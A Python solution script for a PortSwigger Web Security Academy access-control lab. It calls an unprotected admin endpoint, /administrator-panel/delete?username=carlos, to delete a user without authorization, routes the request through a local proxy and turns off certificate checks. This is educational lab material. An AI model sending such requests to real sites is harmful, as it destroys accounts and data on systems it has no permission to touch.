#!/usr/bin/env python3
# Lab: Unprotected admin functionality
# Lab-Link: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    url = f'{host}/administrator-panel/delete?username=carlos'
    r = requests.get(url, verify=False, proxies=proxies)
    if 'Congratulations, you solved the lab!' in r.text:
        print(f'[+] Deleted user carlos, lab solved')
    else:
        print(f'[-] Failed to delete user carlos ')


if __name__ == "__main__":
    main()
